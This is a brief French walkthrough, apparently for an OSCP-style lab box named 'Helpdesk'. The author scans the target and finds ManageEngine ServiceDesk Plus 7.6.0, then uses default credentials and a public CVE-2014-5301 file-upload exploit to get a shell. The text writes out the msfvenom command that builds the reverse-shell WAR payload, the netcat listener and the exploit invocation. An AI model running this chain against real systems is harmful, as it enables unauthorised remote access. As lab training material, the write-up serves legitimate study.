# Helpdesk

    sudo nmap -p- -sV -T5 192.168.205.43
    sudo masscan -p1-65535,U:1-65535 --rate=1000 192.168.205.43 --tun0
    sudo /home/timothe/.local/bin/autorecon 192.168.205.43
Scans classiques.    

On voit un CMS ("ManageEngine ServiceDesk Plus" version 7.6.0) sur le site http://192.168.197.43:8080/ et une simple recherche Google suffit à trouver les credentials par défaut de ce CMS. Une deuxième recherche Google suffit à trouver pas mal d'exploits critiques, dont plusieurs XSS. Mais le point le plus intéressant est le CVE-2014-5301 qui permet directement l'upload arbitraire de fichiers. Encore une fois je me suis dirigé vers une version sans Metasploit pour mieux me préparer à l'OSCP.

Voici une implémentation en Python : https://github.com/PeterSufliarsky/exploits/blob/master/CVE-2014-5301.py

    vim exploit_CVE-2014-5301_ManageEngine.py
    msfvenom -p java/shell_reverse_tcp LHOST=192.168.45.234 LPORT=9999 -f war > shell.war
    rlwrap nc -nvlp 9999
    python3 exploit_CVE-2014-5301_ManageEngine.py 192.168.197.43 8080 administrator administrator shell.war
    ...
    C:\ManageEngine\ServiceDesk\bin> type C:\Users\Administrator\Desktop\proof.txt

